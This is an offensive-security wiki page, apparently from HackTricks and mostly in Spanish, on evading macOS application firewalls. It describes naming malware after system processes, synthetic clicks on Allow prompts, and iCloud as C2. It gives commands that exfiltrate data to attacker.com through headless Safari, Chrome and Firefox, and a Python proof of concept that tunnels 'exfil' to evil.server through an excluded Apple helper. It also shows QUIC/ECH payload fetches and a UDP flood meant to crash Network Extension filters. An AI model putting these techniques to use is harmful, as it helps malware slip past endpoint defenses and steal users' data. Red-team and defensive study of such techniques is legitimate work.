# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Found techniques

Las siguientes técnicas fueron comprobadas en algunas apps de firewall de macOS.

### Abusing whitelist names

- Por ejemplo, nombrar el malware con nombres de procesos conocidos de macOS como **`launchd`**

### Synthetic Click

- Si el firewall solicita permiso al usuario, hacer que el malware **haga clic en Permitir**

### **Use Apple signed binaries**

- Como **`curl`**, pero también otros como **`whois`**

### Well known apple domains

El firewall podría permitir conexiones a dominios conocidos de Apple como **`apple.com`** o **`icloud.com`**. Y iCloud podría usarse como un C2.

### Generic Bypass

Algunas ideas para intentar evadir firewalls

### Check allowed traffic

Conocer el tráfico permitido te ayudará a identificar dominios potencialmente whitelisted o qué aplicaciones tienen permitido acceder a ellos
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abuso de DNS

Las resoluciones de DNS se realizan mediante la aplicación firmada **`mdnsreponder`**, que probablemente estará permitida para contactar con los servidores DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### A través de aplicaciones del navegador

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recientes macOS firewall bypass vulnerabilities (2023-2025)

### Filtro de contenido web (Screen Time) bypass – **CVE-2024-44206**
En julio de 2024 Apple parcheó un fallo crítico en Safari/WebKit que rompió el filtro de contenido web a nivel del sistema usado por los controles parentales de Screen Time.
Un URI especialmente diseñado (por ejemplo, con “://” doblemente codificado en URL) no es reconocido por el ACL de Screen Time pero sí es aceptado por WebKit, por lo que la petición se envía sin filtrar. Cualquier proceso que pueda abrir una URL (incluido código sandboxed o sin firmar) puede, por tanto, alcanzar dominios que están explícitamente bloqueados por el usuario o por un perfil MDM.

Prueba práctica (sistema sin parchear):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Error de orden de reglas de Packet Filter (PF) en las primeras versiones de macOS 14 “Sonoma”
Durante el ciclo beta de macOS 14 Apple introdujo una regresión en el envoltorio de espacio de usuario alrededor de **`pfctl`**.
Las reglas que se añadieron con la palabra clave `quick` (usada por muchos VPN kill-switches) se ignoraron silenciosamente, causando traffic leaks incluso cuando la GUI del VPN/firewall reportaba *blocked*. El bug fue confirmado por varios proveedores de VPN y corregido en RC 2 (build 23A344).

Comprobación rápida de leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abusar de los servicios auxiliares firmados por Apple (legado – pre-macOS 11.2)
Antes de macOS 11.2 la **`ContentFilterExclusionList`** permitía que ~50 binarios de Apple, como **`nsurlsessiond`** y la App Store, eludieran todos los socket-filter firewalls implementados con el Network Extension framework (LuLu, Little Snitch, etc.).
El malware podía simplemente spawn un proceso excluido—o inyectar código en él—y tunnel su propio tráfico sobre el socket ya permitido. Apple eliminó completamente la lista de exclusión en macOS 11.2, pero la técnica sigue siendo relevante en sistemas que no pueden actualizarse.

Ejemplo de proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH para evadir los filtros de dominio de Network Extension (macOS 12+)
NEFilter Packet/Data Providers se basan en el TLS ClientHello SNI/ALPN. Con **HTTP/3 over QUIC (UDP/443)** y **Encrypted Client Hello (ECH)** el SNI permanece cifrado, NetExt no puede analizar el flujo y las reglas de hostname a menudo fail-open, permitiendo que malware alcance dominios bloqueados sin tocar DNS.

PoC mínimo:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Si QUIC/ECH sigue habilitado, este es un camino fácil para evadir hostname-filter.

### Inestabilidad de Network Extension en macOS 15 “Sequoia” (2024–2025)
Las primeras builds 15.0/15.1 provocaban crash en los filtros third‑party de **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne, etc.). Cuando el filtro se reinicia, macOS elimina sus flow rules y muchos productos quedan fail‑open. Saturar el filtro con miles de UDP flows cortos (o forzar QUIC/ECH) puede provocar repetidamente el crash y dejar una ventana para C2/exfil mientras la GUI sigue afirmando que el firewall está en funcionamiento.

Reproducción rápida (equipo de laboratorio seguro):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Consejos de herramientas para macOS moderno

1. Inspecciona las reglas PF actuales que generan los firewalls GUI:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumera los binarios que ya poseen el *outgoing-network* entitlement (useful for piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registra programáticamente tu propio Network Extension content filter en Objective-C/Swift.
Un rootless PoC mínimo que reenvía paquetes a un socket local está disponible en el código fuente de Patrick Wardle’s **LuLu**.

## Referencias

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
